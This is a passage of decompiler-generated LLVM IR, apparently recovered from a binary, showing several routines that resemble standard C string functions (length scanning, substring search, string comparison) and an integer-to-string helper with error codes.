  %v2_1000e110 = sub i32 %v0_1000e10c.v0_1000e19c, %v0_1000e0dc
  ret i32 %v2_1000e110

dec_label_pc_1000e118:                            ; preds = %dec_label_pc_1000e0f4
  %v1_1000e118 = add i32 %v0_1000e10c, 1
  %v1_1000e11c = urem i32 %v1_1000e118, 4
  %v3_1000e11c = icmp eq i32 %v1_1000e11c, 0
  br i1 %v3_1000e11c, label %dec_label_pc_1000e124, label %dec_label_pc_1000e0f4

dec_label_pc_1000e124:                            ; preds = %dec_label_pc_1000e118, %dec_label_pc_1000e0ec
  %v0_1000e128 = phi i32 [ %v0_1000e0dc, %dec_label_pc_1000e0ec ], [ %v1_1000e118, %dec_label_pc_1000e118 ]
  %v2_1000e1903 = icmp ult i32 %v0_1000e128, %v0_1000e19c
  br i1 %v2_1000e1903, label %dec_label_pc_1000e134, label %dec_label_pc_1000e198

dec_label_pc_1000e134:                            ; preds = %dec_label_pc_1000e124, %dec_label_pc_1000e18c
  %v0_1000e0d4 = phi i32 [ %v1_1000e138, %dec_label_pc_1000e18c ], [ %v0_1000e128, %dec_label_pc_1000e124 ]
  %v1_1000e134 = inttoptr i32 %v0_1000e0d4 to i32*
  %v2_1000e134 = load i32, i32* %v1_1000e134, align 4
  %v1_1000e138 = add i32 %v0_1000e0d4, 4
  store i32 %v0_1000e0d4, i32* @r7, align 4
  %v1_1000e140 = add i32 %v0_1000e0d4, 1
  %v1_1000e148 = add i32 %v2_1000e134, -16843009
  %v2_1000e14c = and i32 %v1_1000e148, -2139062144
  %v5_1000e14c = icmp eq i32 %v2_1000e14c, 0
  br i1 %v5_1000e14c, label %dec_label_pc_1000e18c, label %dec_label_pc_1000e154

dec_label_pc_1000e154:                            ; preds = %dec_label_pc_1000e134
  %v2_1000e154 = inttoptr i32 %v0_1000e0d4 to i8*
  %v3_1000e154 = load i8, i8* %v2_1000e154, align 1
  %v3_1000e158 = icmp eq i8 %v3_1000e154, 0
  br i1 %v3_1000e158, label %dec_label_pc_1000e0d4, label %dec_label_pc_1000e160

dec_label_pc_1000e160:                            ; preds = %dec_label_pc_1000e154
  %v2_1000e160 = inttoptr i32 %v1_1000e140 to i8*
  %v3_1000e160 = load i8, i8* %v2_1000e160, align 1
  %v3_1000e164 = icmp eq i8 %v3_1000e160, 0
  br i1 %v3_1000e164, label %dec_label_pc_1000e198, label %dec_label_pc_1000e16c

dec_label_pc_1000e16c:                            ; preds = %dec_label_pc_1000e160
  %v1_1000e16c = add i32 %v0_1000e0d4, 2
  %v2_1000e16c = inttoptr i32 %v1_1000e16c to i8*
  %v3_1000e16c = load i8, i8* %v2_1000e16c, align 1
  %v3_1000e174 = icmp eq i8 %v3_1000e16c, 0
  br i1 %v3_1000e174, label %dec_label_pc_1000e198, label %dec_label_pc_1000e17c

dec_label_pc_1000e17c:                            ; preds = %dec_label_pc_1000e16c
  %v1_1000e17c = add i32 %v0_1000e0d4, 3
  %v2_1000e17c = inttoptr i32 %v1_1000e17c to i8*
  %v3_1000e17c = load i8, i8* %v2_1000e17c, align 1
  %v3_1000e184 = icmp eq i8 %v3_1000e17c, 0
  br i1 %v3_1000e184, label %dec_label_pc_1000e198, label %dec_label_pc_1000e18c

dec_label_pc_1000e18c:                            ; preds = %dec_label_pc_1000e17c, %dec_label_pc_1000e134
  %v2_1000e190 = icmp ult i32 %v1_1000e138, %v0_1000e19c
  br i1 %v2_1000e190, label %dec_label_pc_1000e134, label %dec_label_pc_1000e198

dec_label_pc_1000e198:                            ; preds = %dec_label_pc_1000e18c, %dec_label_pc_1000e160, %dec_label_pc_1000e16c, %dec_label_pc_1000e17c, %dec_label_pc_1000e124, %dec_label_pc_1000e0d4
  %v0_1000e1a4 = phi i32 [ %v0_1000e0d4, %dec_label_pc_1000e0d4 ], [ %v0_1000e128, %dec_label_pc_1000e124 ], [ %v1_1000e17c, %dec_label_pc_1000e17c ], [ %v1_1000e16c, %dec_label_pc_1000e16c ], [ %v1_1000e140, %dec_label_pc_1000e160 ], [ %v0_1000e19c, %dec_label_pc_1000e18c ]
  %v3_1000e198 = icmp ugt i32 %v0_1000e19c, %v0_1000e1a4
  %v0_1000e1a4.v0_1000e19c = select i1 %v3_1000e198, i32 %v0_1000e1a4, i32 %v0_1000e19c
  %v2_1000e1a8 = sub i32 %v0_1000e1a4.v0_1000e19c, %v0_1000e0dc
  ret i32 %v2_1000e1a8

; uselistorder directives
  uselistorder i32 %v1_1000e138, { 1, 0 }
  uselistorder i32 %v0_1000e0d4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v0_1000e128, { 1, 0, 2 }
  uselistorder i32 %v1_1000e118, { 1, 0, 2 }
  uselistorder i32 %v0_1000e10c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000e19c, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000e0dc, { 1, 0 }
  uselistorder i32 %v0_1000e0dc, { 4, 3, 5, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_1000e198, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000e134, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0ec, { 1, 0 }
}

define i32 @function_1000e1b0(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000e1b0:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000e1b0 = load i8, i8* %arg2, align 1
  %v4_1000e1b0 = zext i8 %v3_1000e1b0 to i32
  store i32 %v4_1000e1b0, i32* %r6.global-to-local, align 4
  %v3_1000e1b4 = icmp eq i8 %v3_1000e1b0, 0
  %v0_1000e1b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e1b4, i32 %v0_1000e1b8)
  %v1_1000e1bc = add i32 %arg1, -1
  store i32 %v1_1000e1bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e1c0

dec_label_pc_1000e1c0:                            ; preds = %dec_label_pc_1000e1d0, %dec_label_pc_1000e1b0
  %v0_1000e1c0 = phi i32 [ %v1_1000e1c0, %dec_label_pc_1000e1d0 ], [ %v1_1000e1bc, %dec_label_pc_1000e1b0 ]
  %v1_1000e1c0 = add i32 %v0_1000e1c0, 1
  %v2_1000e1c0 = inttoptr i32 %v1_1000e1c0 to i8*
  %v3_1000e1c0 = load i8, i8* %v2_1000e1c0, align 1
  store i32 %v1_1000e1c0, i32* %r3.global-to-local, align 4
  %v3_1000e1c4 = icmp eq i8 %v3_1000e1c0, 0
  br i1 %v3_1000e1c4, label %dec_label_pc_1000e29c, label %dec_label_pc_1000e1d0

dec_label_pc_1000e1d0:                            ; preds = %dec_label_pc_1000e1c0
  %v4_1000e1c8 = icmp eq i8 %v3_1000e1c0, %v3_1000e1b0
  br i1 %v4_1000e1c8, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e1c0

dec_label_pc_1000e1d4:                            ; preds = %dec_label_pc_1000e1d0
  %v2_1000e1d4 = add i32 %tmp, 1
  %v3_1000e1d4 = inttoptr i32 %v2_1000e1d4 to i8*
  %v4_1000e1d4 = load i8, i8* %v3_1000e1d4, align 1
  %v5_1000e1d4 = zext i8 %v4_1000e1d4 to i32
  store i32 %v5_1000e1d4, i32* %r5.global-to-local, align 4
  store i32 %v2_1000e1d4, i32* %r4.global-to-local, align 4
  %v3_1000e1dc = icmp eq i8 %v4_1000e1d4, 0
  %v0_1000e1e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e1dc, i32 %v0_1000e1e0)
  %v0_1000e1e4.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e228

dec_label_pc_1000e1f0:                            ; preds = %dec_label_pc_1000e290
  %v3_1000e1f0 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000e1f0 = zext i8 %v3_1000e1f0 to i32
  store i32 %v1_1000e1e4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e218.preheader

dec_label_pc_1000e218.preheader:                  ; preds = %dec_label_pc_1000e1f0, %dec_label_pc_1000e228
  %v0_1000e21816 = phi i32 [ %v4_1000e1f0, %dec_label_pc_1000e1f0 ], [ %storemerge4, %dec_label_pc_1000e228 ]
  %v1_1000e218.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000e21824 = icmp eq i32 %v0_1000e21816, %v1_1000e218.pre
  %v3_1000e21c26 = icmp eq i32 %v0_1000e21816, 0
  br i1 %v4_1000e21824, label %dec_label_pc_1000e228, label %dec_label_pc_1000e1fc

dec_label_pc_1000e1fc:                            ; preds = %dec_label_pc_1000e218.preheader, %dec_label_pc_1000e214
  %v3_1000e21c28 = phi i1 [ %v3_1000e21c, %dec_label_pc_1000e214 ], [ %v3_1000e21c26, %dec_label_pc_1000e218.preheader ]
  %v0_1000e20027 = phi i32 [ %v1_1000e214, %dec_label_pc_1000e214 ], [ %v1_1000e1e4, %dec_label_pc_1000e218.preheader ]
  br i1 %v3_1000e21c28, label %dec_label_pc_1000e29c, label %dec_label_pc_1000e200

dec_label_pc_1000e200:                            ; preds = %dec_label_pc_1000e1fc
  %v1_1000e200 = add i32 %v0_1000e20027, 1
  %v2_1000e200 = inttoptr i32 %v1_1000e200 to i8*
  %v3_1000e200 = load i8, i8* %v2_1000e200, align 1
  %v4_1000e200 = zext i8 %v3_1000e200 to i32
  store i32 %v1_1000e200, i32* %r11.global-to-local, align 4
  %v4_1000e204 = icmp eq i32 %v4_1000e200, %v1_1000e218.pre
  br i1 %v4_1000e204, label %dec_label_pc_1000e228, label %dec_label_pc_1000e210

dec_label_pc_1000e210:                            ; preds = %dec_label_pc_1000e200
  %v3_1000e208 = icmp eq i8 %v3_1000e200, 0
  br i1 %v3_1000e208, label %dec_label_pc_1000e29c, label %dec_label_pc_1000e214

dec_label_pc_1000e214:                            ; preds = %dec_label_pc_1000e210
  %v1_1000e214 = add i32 %v0_1000e20027, 2
  %v2_1000e214 = inttoptr i32 %v1_1000e214 to i8*
  %v3_1000e214 = load i8, i8* %v2_1000e214, align 1
  %v4_1000e214 = zext i8 %v3_1000e214 to i32
  store i32 %v1_1000e214, i32* %r11.global-to-local, align 4
  %v4_1000e218 = icmp eq i32 %v4_1000e214, %v1_1000e218.pre
  %v3_1000e21c = icmp eq i8 %v3_1000e214, 0
  br i1 %v4_1000e218, label %dec_label_pc_1000e228, label %dec_label_pc_1000e1fc

dec_label_pc_1000e228:                            ; preds = %dec_label_pc_1000e218.preheader, %dec_label_pc_1000e214, %dec_label_pc_1000e200, %dec_label_pc_1000e1d4
  %v0_1000e1e4.sink = phi i32 [ %v0_1000e1e4.sink.pre, %dec_label_pc_1000e1d4 ], [ %v1_1000e1e4, %dec_label_pc_1000e218.preheader ], [ %v1_1000e214, %dec_label_pc_1000e214 ], [ %v1_1000e200, %dec_label_pc_1000e200 ]
  %v1_1000e1e4 = add i32 %v0_1000e1e4.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000e1e4 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000e1e4, i32* %r11.global-to-local, align 4
  %v1_1000e228 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000e228 = icmp eq i32 %storemerge4, %v1_1000e228
  br i1 %v4_1000e228, label %dec_label_pc_1000e230, label %dec_label_pc_1000e218.preheader

dec_label_pc_1000e230:                            ; preds = %dec_label_pc_1000e228
  %v1_1000e230 = add i32 %v0_1000e1e4.sink, 2
  %v2_1000e230 = inttoptr i32 %v1_1000e230 to i8*
  %v3_1000e230 = load i8, i8* %v2_1000e230, align 1
  %v4_1000e230 = zext i8 %v3_1000e230 to i32
  store i32 %v4_1000e230, i32* %r10.global-to-local, align 4
  store i32 %v0_1000e1e4.sink, i32* %r3.global-to-local, align 4
  %v0_1000e238 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e238 = add i32 %v0_1000e238, 1
  %v2_1000e238 = inttoptr i32 %v1_1000e238 to i8*
  %v3_1000e238 = load i8, i8* %v2_1000e238, align 1
  %v4_1000e238 = zext i8 %v3_1000e238 to i32
  store i32 %v1_1000e238, i32* %r8.global-to-local, align 4
  store i32 %v1_1000e230, i32* %r11.global-to-local, align 4
  %v4_1000e244 = icmp eq i8 %v3_1000e230, %v3_1000e238
  br i1 %v4_1000e244, label %dec_label_pc_1000e24c, label %dec_label_pc_1000e290

dec_label_pc_1000e24c:                            ; preds = %dec_label_pc_1000e230, %dec_label_pc_1000e278.dec_label_pc_1000e24c_crit_edge
  %v0_1000e250 = phi i32 [ %v0_1000e250.pre, %dec_label_pc_1000e278.dec_label_pc_1000e24c_crit_edge ], [ %v1_1000e230, %dec_label_pc_1000e230 ]
  %v0_1000e24c = phi i32 [ %v4_1000e27c, %dec_label_pc_1000e278.dec_label_pc_1000e24c_crit_edge ], [ %v4_1000e230, %dec_label_pc_1000e230 ]
  %v3_1000e24c = icmp eq i32 %v0_1000e24c, 0
  %v1_1000e250 = add i32 %v0_1000e250, 1
  store i32 %v1_1000e250, i32* %r7.global-to-local, align 4
  %v0_1000e254 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e24c, i32 %v0_1000e254)
  %v0_1000e258 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000e258 = add i32 %v0_1000e258, 1
  %v2_1000e258 = inttoptr i32 %v1_1000e258 to i8*
  %v3_1000e258 = load i8, i8* %v2_1000e258, align 1
  %v4_1000e258 = zext i8 %v3_1000e258 to i32
  store i32 %v1_1000e258, i32* %r10.global-to-local, align 4
  %v0_1000e260 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e260 = add i32 %v0_1000e260, 1
  %v2_1000e260 = inttoptr i32 %v1_1000e260 to i8*
  %v3_1000e260 = load i8, i8* %v2_1000e260, align 1
  %v1_1000e264 = add i32 %v0_1000e258, 2
  store i32 %v1_1000e264, i32* %r8.global-to-local, align 4
  %v0_1000e268 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e268 = add i32 %v0_1000e268, 1
  store i32 %v1_1000e268, i32* %r11.global-to-local, align 4
  %v4_1000e270 = icmp eq i8 %v3_1000e260, %v3_1000e258
  br i1 %v4_1000e270, label %dec_label_pc_1000e278, label %dec_label_pc_1000e290

dec_label_pc_1000e278:                            ; preds = %dec_label_pc_1000e24c
  %v3_1000e26c = icmp eq i8 %v3_1000e258, 0
  %v0_1000e278 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e26c, i32 %v0_1000e278)
  %v0_1000e27c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e27c = add i32 %v0_1000e27c, 1
  %v2_1000e27c = inttoptr i32 %v1_1000e27c to i8*
  %v3_1000e27c = load i8, i8* %v2_1000e27c, align 1
  %v4_1000e27c = zext i8 %v3_1000e27c to i32
  %v0_1000e280 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e280 = add i32 %v0_1000e280, 1
  %v2_1000e280 = inttoptr i32 %v1_1000e280 to i8*
  %v3_1000e280 = load i8, i8* %v2_1000e280, align 1
  store i32 %v4_1000e27c, i32* %r10.global-to-local, align 4
  %v4_1000e288 = icmp eq i8 %v3_1000e280, %v3_1000e27c
  br i1 %v4_1000e288, label %dec_label_pc_1000e278.dec_label_pc_1000e24c_crit_edge, label %dec_label_pc_1000e290

dec_label_pc_1000e278.dec_label_pc_1000e24c_crit_edge: ; preds = %dec_label_pc_1000e278
  %v0_1000e250.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e24c

dec_label_pc_1000e290:                            ; preds = %dec_label_pc_1000e278, %dec_label_pc_1000e24c, %dec_label_pc_1000e230
  %v0_1000e290 = phi i32 [ %v4_1000e238, %dec_label_pc_1000e230 ], [ %v4_1000e27c, %dec_label_pc_1000e278 ], [ %v4_1000e258, %dec_label_pc_1000e24c ]
  %v3_1000e290 = icmp eq i32 %v0_1000e290, 0
  br i1 %v3_1000e290, label %dec_label_pc_1000e298, label %dec_label_pc_1000e1f0

dec_label_pc_1000e298:                            ; preds = %dec_label_pc_1000e290
  ret i32 %v0_1000e1e4.sink

dec_label_pc_1000e29c:                            ; preds = %dec_label_pc_1000e1c0, %dec_label_pc_1000e210, %dec_label_pc_1000e1fc
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000e27c, { 0, 2, 1 }
  uselistorder i8 %v3_1000e258, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000e1e4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000e1e4.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000e214, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000e20027, { 1, 0 }
  uselistorder i32 %v1_1000e218.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000e1c0, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000e29c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e24c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e228, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000e1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e218.preheader, { 1, 0 }
}

define i32 @function_1000e2a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000e2a4:
  store i32 %arg1, i32* @r4, align 4
  store i32 268493500, i32* @lr, align 4
  %v0_1000e2b8 = call i32 @function_1000e2d4()
  %v0_1000e2c0 = load i32, i32* @r29, align 4
  ret i32 %v0_1000e2c0
}

define i32 @function_1000e2d4() local_unnamed_addr {
dec_label_pc_1000e2d4:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000e2dc = load i32, i32* @r3, align 4
  %v2_1000e2dc = icmp ugt i32 %v0_1000e2dc, 124
  %v0_1000e2e4 = load i32, i32* @r4, align 4
  store i32 %v0_1000e2e4, i32* %r27.global-to-local, align 4
  %v0_1000e2ec = load i32, i32* @r5, align 4
  br i1 %v2_1000e2dc, label %dec_label_pc_1000e330, label %dec_label_pc_1000e2f4

dec_label_pc_1000e2f4:                            ; preds = %dec_label_pc_1000e2d4
  store i32 ptrtoint ([8 x i8]* @global_var_1001952c.731 to i32), i32* %r30.global-to-local, align 4
  %v3_1000e3184 = icmp eq i32 %v0_1000e2dc, 0
  br i1 %v3_1000e3184, label %dec_label_pc_1000e324, label %dec_label_pc_1000e304

dec_label_pc_1000e304:                            ; preds = %dec_label_pc_1000e2f4, %dec_label_pc_1000e304
  %v0_1000e308 = phi i32 [ %v1_1000e308, %dec_label_pc_1000e304 ], [ ptrtoint ([8 x i8]* @global_var_1001952c.731 to i32), %dec_label_pc_1000e2f4 ]
  %v1_1000e308 = add i32 %v0_1000e308, 1
  store i32 %v1_1000e308, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e304

dec_label_pc_1000e324:                            ; preds = %dec_label_pc_1000e2f4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e364

dec_label_pc_1000e330:                            ; preds = %dec_label_pc_1000e2d4
  %tmp = icmp slt i32 %v0_1000e2dc, 0
  %v1_1000e334 = zext i1 %tmp to i32
  %v2_1000e334 = ashr i32 %v0_1000e2dc, 31
  %v3_1000e334 = and i32 %v2_1000e334, -2
  %v4_1000e334 = or i32 %v3_1000e334, %v1_1000e334
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000e348 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000e348 = call i32 @function_10010c00(i8* %v5_1000e348, i32 %v4_1000e334, i32 %v0_1000e2dc, i32 -10, i32 0)
  %v1_1000e350 = add i32 %v6_1000e348, -14
  store i32 %v1_1000e350, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1001951c.732 to i32), i32* @r4, align 4
  store i32 %v1_1000e350, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268493668, i32* @lr, align 4
  %v0_1000e360 = call i32 @function_1000dcb0()
  %v0_1000e364.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000e368.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e378.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e364

dec_label_pc_1000e364:                            ; preds = %dec_label_pc_1000e324, %dec_label_pc_1000e330
  %v0_1000e378 = phi i32 [ %v0_1000e2ec, %dec_label_pc_1000e324 ], [ %v0_1000e378.pre, %dec_label_pc_1000e330 ]
  %v0_1000e368 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1001952c.731 to i32), %dec_label_pc_1000e324 ], [ %v0_1000e368.pre, %dec_label_pc_1000e330 ]
  %v1_1000e36c = phi i32 [ %v0_1000e2e4, %dec_label_pc_1000e324 ], [ %v0_1000e364.pre, %dec_label_pc_1000e330 ]
  %tmp21 = icmp slt i32 %v1_1000e36c, 0
  %v1_1000e364 = zext i1 %tmp21 to i32
  %v2_1000e364 = ashr i32 %v1_1000e36c, 31
  %v3_1000e364 = and i32 %v2_1000e364, -2
  %v4_1000e364 = or i32 %v3_1000e364, %v1_1000e364
  store i32 %v0_1000e368, i32* @r3, align 4
  %v2_1000e36c = xor i32 %v4_1000e364, %v1_1000e36c
  %v2_1000e370 = sub i32 %v4_1000e364, %v2_1000e36c
  %tmp22 = icmp slt i32 %v2_1000e370, 0
  %v1_1000e374 = zext i1 %tmp22 to i32
  %v2_1000e374 = ashr i32 %v2_1000e370, 31
  %v3_1000e374 = and i32 %v2_1000e374, -2
  %v4_1000e374 = or i32 %v3_1000e374, %v1_1000e374
  %v2_1000e378 = and i32 %v4_1000e374, %v0_1000e378
  store i32 %v2_1000e378, i32* @r29, align 4
  %v0_1000e37c = call i32 @function_1000df60()
  %v1_1000e380 = add i32 %v0_1000e37c, 1
  store i32 %v1_1000e380, i32* %r31.global-to-local, align 4
  %v1_1000e384 = load i32, i32* @r29, align 4
  %v3_1000e384 = icmp ugt i32 %v1_1000e380, %v1_1000e384
  br i1 %v3_1000e384, label %dec_label_pc_1000e38c, label %dec_label_pc_1000e394

dec_label_pc_1000e38c:                            ; preds = %dec_label_pc_1000e364
  store i32 %v1_1000e384, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e394

dec_label_pc_1000e394:                            ; preds = %dec_label_pc_1000e364, %dec_label_pc_1000e38c
  %v0_1000e3a4 = phi i32 [ %v1_1000e384, %dec_label_pc_1000e38c ], [ %v1_1000e380, %dec_label_pc_1000e364 ]
  %v3_1000e394 = icmp eq i32 %v0_1000e3a4, 0
  br i1 %v3_1000e394, label %dec_label_pc_1000e3b8, label %dec_label_pc_1000e39c

dec_label_pc_1000e39c:                            ; preds = %dec_label_pc_1000e394
  %v0_1000e39c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e39c, i32* @r4, align 4
  %v0_1000e3a0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000e3a0, i32* @r3, align 4
  store i32 %v0_1000e3a4, i32* @r5, align 4
  store i32 268493740, i32* @lr, align 4
  %v0_1000e3a8 = call i32 @function_1000dcb0()
  %v1_1000e3ac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e3ac = add i32 %v1_1000e3ac, %v0_1000e3a0
  %v3_1000e3b4 = add i32 %v2_1000e3ac, -1
  %v4_1000e3b4 = inttoptr i32 %v3_1000e3b4 to i8*
  store i8 0, i8* %v4_1000e3b4, align 1
  br label %dec_label_pc_1000e3b8

dec_label_pc_1000e3b8:                            ; preds = %dec_label_pc_1000e394, %dec_label_pc_1000e39c
  %v0_1000e3b8 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000e3b8 = icmp eq i32 %v0_1000e3b8, 0
  br i1 %v3_1000e3b8, label %dec_label_pc_1000e3c8, label %dec_label_pc_1000e3c0

dec_label_pc_1000e3c0:                            ; preds = %dec_label_pc_1000e3b8
  %v0_1000e3c0 = call i32 @function_1000c85c()
  %v0_1000e3c4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000e3c4 = inttoptr i32 %v0_1000e3c0 to i32*
  store i32 %v0_1000e3c4, i32* %v2_1000e3c4, align 4
  %v0_1000e3cc.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e3c8

dec_label_pc_1000e3c8:                            ; preds = %dec_label_pc_1000e3b8, %dec_label_pc_1000e3c0
  %v0_1000e3cc = phi i32 [ 0, %dec_label_pc_1000e3b8 ], [ %v0_1000e3cc.pre, %dec_label_pc_1000e3c0 ]
  ret i32 %v0_1000e3cc

; uselistorder directives
  uselistorder i32 %v2_1000e370, { 1, 0 }
  uselistorder i32 %v4_1000e364, { 1, 0 }
  uselistorder i32 %v1_1000e36c, { 1, 2, 0 }
  uselistorder i32 %v1_1000e308, { 1, 0 }
  uselistorder i32 %v0_1000e2dc, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1001952c.731 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e3b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e394, { 1, 0 }
  uselistorder label %dec_label_pc_1000e364, { 1, 0 }
  uselistorder label %dec_label_pc_1000e304, { 1, 0 }
}

define i32 @function_1000e3e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000e3e0:
  %v2_1000e3ec = call i32 @function_10011470(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000e3ec
}

define i32 @function_1000e3f0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000e3f0:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000e3f8 = load i32, i32* bitcast (i32** @global_var_1002b8f4.734 to i32*), align 4
  store i32 %v3_1000e3f8, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e400

dec_label_pc_1000e400:                            ; preds = %dec_label_pc_1000e400.backedge, %dec_label_pc_1000e3f0
  %v0_1000e400 = phi i32 [ %v0_1000e400.pre, %dec_label_pc_1000e400.backedge ], [ %arg2, %dec_label_pc_1000e3f0 ]
  %v1_1000e400 = inttoptr i32 %v0_1000e400 to i8*
  %v2_1000e400 = load i8, i8* %v1_1000e400, align 1
  %v3_1000e400 = zext i8 %v2_1000e400 to i32
  store i32 %v3_1000e400, i32* %r0.global-to-local, align 4
  %v1_1000e404 = add i32 %v0_1000e400, 1
  store i32 %v1_1000e404, i32* %r10.global-to-local, align 4
  %v3_1000e408 = icmp eq i8 %v2_1000e400, 0
  %v1_1000e40c = mul nuw nsw i32 %v3_1000e400, 2
  store i32 %v1_1000e40c, i32* %r9.global-to-local, align 4
  %v0_1000e410 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e408, i32 %v0_1000e410)
  %v0_1000e414 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000e414 = inttoptr i32 %v0_1000e414 to i8*
  %v2_1000e414 = load i8, i8* %v1_1000e414, align 1
  %v3_1000e414 = zext i8 %v2_1000e414 to i32
  %v1_1000e418 = add i32 %v0_1000e414, 1
  store i32 %v1_1000e418, i32* %r8.global-to-local, align 4
  %v0_1000e41c = load i32, i32* %r0.global-to-local, align 4
  %v4_1000e41c = icmp eq i32 %v0_1000e41c, %v3_1000e414
  br i1 %v4_1000e41c, label %dec_label_pc_1000e400.backedge, label %dec_label_pc_1000e428

dec_label_pc_1000e400.backedge:                   ; preds = %dec_label_pc_1000e400, %dec_label_pc_1000e428, %dec_label_pc_1000e43c
  %v0_1000e400.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e400

dec_label_pc_1000e428:                            ; preds = %dec_label_pc_1000e400
  %v1_1000e420 = mul nuw nsw i32 %v3_1000e414, 2
  %v0_1000e428 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e428 = load i32, i32* %r6.global-to-local, align 4
